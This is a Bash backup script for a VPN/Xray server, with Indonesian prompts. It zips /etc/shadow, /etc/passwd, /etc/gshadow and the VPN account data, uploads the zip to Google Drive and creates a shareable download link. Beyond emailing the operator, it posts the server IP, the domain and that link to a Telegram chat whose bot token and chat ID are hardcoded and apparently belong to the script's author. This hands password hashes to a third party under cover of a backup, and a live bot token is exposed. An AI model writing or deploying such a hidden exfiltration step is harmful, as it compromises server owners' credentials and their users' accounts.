#!/bin/bash
# ==========================================
# Color
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
# ==========================================
export CHATID="1624209723"
export KEY="6568779328:AAHaq75VFPoPwlXLfHtrwie7T-zDsOXabFc"
export TIME="10"
export URL="https://api.telegram.org/bot$KEY/sendMessage"
clear
IP=$(curl -sS ipv4.icanhazip.com)
domain=$(cat /etc/xray/domain)
date=$(date +"%Y-%m-%d")
clear
email=$(cat /root/email)
if [[ "$email" = "" ]]; then
echo "Masukkan Email Untuk Menerima Backup"
read -rp "Email : " -e email
cat <<EOF>>/root/email
$email
EOF
fi
clear
echo "Mohon Menunggu , Proses Backup sedang berlangsung !!"
rm -rf /root/backup
mkdir /root/backup
cp /etc/passwd backup/
cp /etc/group backup/
cp /etc/shadow backup/
cp /etc/gshadow backup/
cp /etc/crontab backup/
cp /etc/cron.d backup/cron.d
cp -r /var/lib/kyt/ backup/kyt 
cp -r /etc/xray backup/xray
cp -r /etc/vmess backup/vmess
cp -r /etc/vless backup/vless
cp -r /etc/trojan backup/trojan
cp -r /etc/shadowsocks backup/shadowsocks
cp -r /etc/kyt/limit/vmess/ip/ backup/ip/vmess
cp -r /etc/kyt/limit/vless/ip/ backup/ip/vless
cp -r /etc/kyt/limit/trojan/ip/ backup/ip/trojan
cp -r /etc/kyt/limit/shadowsocks/ip/ backup/ip/shadowsocks
cp -r /etc/kyt/limit/ssh/ip/ backup/ip/ssh
cp -r /var/www/html/ backup/html
cd /root
zip -r $IP-$date.zip backup > /dev/null 2>&1
rclone copy /root/$IP-$date.zip dr:backup/
url=$(rclone link dr:backup/$IP-$date.zip)
id=(`echo $url | grep '^https' | cut -d'=' -f2`)
link="https://drive.google.com/u/4/uc?id=${id}&export=download"
echo -e "
Detail Backup 
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
==================================
" | mail -s "Backup Data" $email
rm -rf /root/backup
rm -r /root/$IP-$date.zip
clear
   CHATID="1624209723"
   KEY="6568779328:AAHaq75VFPoPwlXLfHtrwie7T-zDsOXabFc"
   TIME="10"
   URL="https://api.telegram.org/bot$KEY/sendMessage"
   TEXT="Installasi VPN Script Stable V3.0
<code>━━━━━━━━━━━━━━━━━━━━━</code>
<b>   ✅ BACKUP NOTIF ✅</b>
<b>     Detail Backup VPS</b>
<code>━━━━━━━━━━━━━━━━━━━━━</code>
<b>IP VPS  :</b> <code>${IP} </code>
<b>DOMAIN :</b> <code>${domain}</code>
<b>Tanggal : $date</b>
<code>━━━━━━━━━━━━━━━━━━━━━</code>
<b>Link Backup   :</b> $link
<code>━━━━━━━━━━━━━━━━━━━━━</code>
<code>Silahkan copy Link dan restore di VPS baru</code>
<code>BY BOT : @sdctunneling_bot</code>
"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo ""
clear
echo -e "
Detail Backup 
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
==================================
"
echo "Silahkan copy Link dan restore di VPS baru"
echo ""